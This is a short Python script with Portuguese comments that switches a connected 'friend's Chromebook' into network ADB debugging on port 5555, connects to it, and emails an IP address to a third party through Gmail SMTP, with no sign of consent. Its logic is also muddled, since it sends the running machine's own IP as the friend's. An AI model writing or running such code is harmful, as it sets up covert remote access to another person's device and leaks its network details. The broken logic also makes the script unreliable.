import socket
import smtplib
from email.mime.text import MIMEText
from pyadb import ADB
import subprocess

# Configurações do ADB
porta_local = 5555  # Porta local para o canal de comunicação ADB
amigo_serial = None  # Variável para armazenar o serial do Chromebook do seu amigo

# Função para obter o endereço IP do dispositivo
def obter_endereco_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    endereco_ip = s.getsockname()[0]
    s.close()
    return endereco_ip

# Função para obter o serial do Chromebook do amigo
def obter_serial_amigo():
    adb = ADB()
    dispositivos_conectados = adb.devices()
    for dispositivo in dispositivos_conectados:
        if 'chrome' in dispositivo.lower():
            return dispositivo
    return None

# Função para estabelecer o canal de comunicação ADB
def estabelecer_canal_adb():
    subprocess.run(['adb', 'tcpip', str(porta_local)])
    subprocess.run(['adb', '-s', amigo_serial, 'connect', f'{endereco_ip}:{porta_local}'])

# Função para enviar o IP por e-mail
def enviar_email(ip):
    email_de = 'seu_email@gmail.com'
    senha = 'sua_senha'
    email_para = 'destinatario@teste.com'

    msg = MIMEText(f'O IP do seu amigo é: {ip}')
    msg['Subject'] = 'IP do Amigo'
    msg['From'] = email_de
    msg['To'] = email_para

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_de, senha)
    server.sendmail(email_de, email_para, msg.as_string())
    server.quit()

# Execução das funções
endereco_ip = obter_endereco_ip()
amigo_serial = obter_serial_amigo()

if amigo_serial:
    estabelecer_canal_adb()
    enviar_email(endereco_ip)
else:
    print("Nenhum Chromebook do amigo foi encontrado.")